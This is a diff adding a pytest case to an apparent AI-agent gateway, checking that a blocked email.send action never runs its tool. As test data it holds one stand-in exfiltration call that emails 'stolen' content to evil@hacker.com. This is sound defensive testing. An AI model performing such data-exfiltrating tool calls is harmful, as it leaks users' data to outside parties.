@@ -3,6 +3,7 @@
 import asyncio
 import pytest
 from datetime import datetime, timezone
+from unittest.mock import patch, MagicMock
 
 from app.services.gateway import GatewayService
 from app.services.passport import PassportService
@@ -232,3 +233,42 @@ async def test_tool_outside_intent_blocked(gateway, services, agent_keys, setup_
 
     assert response.decision == Decision.BLOCK
     assert any("not allowed" in r.lower() or "intent" in r.lower() for r in response.reasons)
+
+
+async def test_blocked_action_does_not_execute_tool(gateway, services, agent_keys, setup_db):
+    """A blocked action must not execute the underlying tool."""
+    agent_private_key, intent_hash = await _setup_agent_and_intent(services, agent_keys)
+
+    async with async_session() as db:
+        token = await services["capability"].issue_token(
+            db=db,
+            agent_id="agent_gw_1",
+            intent_hash=intent_hash,
+            capability="email.send",
+            resource="outbox",
+        )
+
+        provenance = {
+            "influenced_by": ["trusted.user"],
+            "uses_data": [],
+            "side_effect": "external_write",
+        }
+        envelope = services["envelope"].create_envelope(
+            agent_id="agent_gw_1",
+            agent_private_key=agent_private_key,
+            run_id="run_gw_block_no_exec",
+            step_id=0,
+            tool="email.send",
+            args={"to": "evil@hacker.com", "body": "stolen"},
+            intent_hash=intent_hash,
+            capability_token_hash=token["token_hash"],
+            provenance=provenance,
+        )
+
+        # Patch get_mock_tool at its usage site to return a MagicMock
+        mock_tool_fn = MagicMock(return_value={"status": "sent"})
+        with patch("app.services.gateway.get_mock_tool", return_value=mock_tool_fn):
+            response = await gateway.execute(db, envelope, "run_gw_block_no_exec")
+            mock_tool_fn.assert_not_called()
+
+    assert response.decision == Decision.BLOCK
